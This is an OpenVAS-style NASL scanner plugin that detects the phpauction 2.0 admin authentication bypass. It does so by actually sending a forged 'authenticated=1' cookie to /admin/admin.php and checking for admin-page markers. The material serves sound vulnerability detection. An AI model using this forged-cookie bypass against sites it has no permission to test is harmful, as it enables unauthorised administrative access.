if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.19239" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 12069 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "phpauction Admin Authentication Bypass" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2005 Tobias Glemser (tglemser@tele-consulting.com)" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Upgrade to a version > 2.0 of this software and/or restrict access
  rights to the administrative directory using .htaccess." );
	script_tag( name: "summary", value: "The remote host is running phpauction prior or equal to 2.0 (or a modified
  version).

  There is a flaw when handling cookie-based authentication credentials which
  may allow an attacker to gain unauthorized administrative access to the
  auction system." );
	script_xref( name: "URL", value: "http://pentest.tele-consulting.com/advisories/04_12_21_phpauction.txt" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/phpauction", "/auction", "/auktion", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/admin/admin.php";
	res = http_get_cache( item: url, port: port );
	if(!res || ContainsString( res, "settings.php" ) || ContainsString( res, "durations.php" ) || ( ContainsString( res, "main.php" ) && ContainsString( res, "<title>Administration</title>" ) )){
		continue;
	}
	req = http_get( item: url, port: port );
	idx = stridx( req, NASLString( "\\r\\n\\r\\n" ) );
	req = insstr( req, "\r\nCookie: authenticated=1;", idx, idx );
	res = http_keepalive_send_recv( port: port, data: req );
	if(!res){
		continue;
	}
	if(ContainsString( res, "settings.php" ) || ContainsString( res, "durations.php" ) || ( ContainsString( res, "main.php" ) && ContainsString( res, "<title>Administration</title>" ) )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

